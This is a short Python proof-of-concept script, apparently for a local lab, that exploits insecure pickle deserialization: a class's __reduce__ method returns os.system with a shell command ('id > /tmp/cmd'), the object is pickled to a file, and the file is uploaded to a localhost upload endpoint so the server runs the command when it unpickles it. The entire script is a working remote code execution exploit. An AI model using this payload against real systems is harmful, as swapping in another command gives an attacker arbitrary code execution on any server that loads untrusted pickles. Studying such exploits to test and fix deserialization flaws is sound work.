import pickle
import os
import requests

class MyObject(object):
    """
    Create an object that implemens the __reduce__ method
    """
    def __reduce__(self):
        """
        https://docs.python.org/3/library/pickle.html#object.__reduce__
        The __reduce__ method here returns a callable object
        and the arguments to pass to that object.
        """
        return os.system, ('id > /tmp/cmd',)

o = MyObject()
p = pickle.dump(o, open('bad.pickle', 'wb'))


url = 'http://localhost:5000/upload'
files = {'file': open("bad.pickle", "rb").read()}
response = requests.post(url, files=files)
print(response.text)